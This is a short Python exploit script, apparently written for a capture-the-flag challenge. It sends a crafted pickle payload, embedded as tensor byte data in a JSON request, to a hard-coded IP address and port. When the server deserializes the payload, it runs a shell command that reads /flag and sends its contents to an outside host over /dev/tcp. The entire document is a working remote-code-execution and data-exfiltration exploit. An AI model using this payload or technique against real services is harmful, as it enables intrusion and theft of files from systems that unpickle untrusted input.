import requests

req = {
	"key": [],
	"value": [],
	"tensors": [
		{
			"elem_type": 13,
			"byte_data": [
				x for x in b"\x80\x04\x95v\x00\x00\x00\x00\x00\x00\x00(\x8c\x08builtins\x8c\x07getattr\x93\x8c\x08builtins\x8c\n__import__\x93\x8c\x02os\x85R\x8c\x06system\x86R\x8c3bash -c 'cat /flag > /dev/tcp/1.2.3.4/51337'\x85R1N."
			],
			"shape": [1]
		}
	]
}

print(req)

r = requests.post(
	"http://47.88.23.73:30137//",
	json = req
)

print(r.text)
